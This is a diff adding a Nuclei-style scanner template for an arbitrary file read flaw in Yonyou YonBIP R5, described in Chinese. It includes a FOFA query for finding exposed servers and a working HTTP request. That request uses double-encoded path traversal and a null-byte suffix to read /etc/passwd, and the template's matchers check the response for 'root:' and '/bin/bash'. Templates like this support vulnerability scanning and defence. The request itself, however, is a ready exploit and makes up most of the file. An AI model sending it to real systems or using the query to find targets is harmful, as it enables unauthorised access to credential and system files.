@@ -1,0 +1,33 @@
+id: yongyouBIP-R5-yonbiplogin-File-reading
+
+info:
+  name: 用友YonBIP R5旗舰版 yonbiplogin Lua脚本路径穿越漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="数字化工作台" || title="YonBIP"
+    YonBIP R5旗舰版在Lua脚本（Nginx）实现中存在路径处理缺陷，攻击者可通过构造特殊路径参数绕过安全校验。该漏洞允许未授权访问者读取任意文件内容，可能导致敏感配置文件、凭证信息及系统数据泄露，严重威胁业务系统安全。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489367&idx=1&sn=663d7d7ade66b040b24ea77019852546&chksm=c267a264f5102b729dc8269c7799351c334585f1a0686f55914d2c71a14aaa54cd9cafc0d16b&token=279945389&lang=zh_CN#rd
+  tags: 用友YonBIP
+
+
+http:
+- raw:
+  - |
+    GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+    - '/bin/bash'
+    condition: and
+  - type: status
+    status:
+    - 200
+
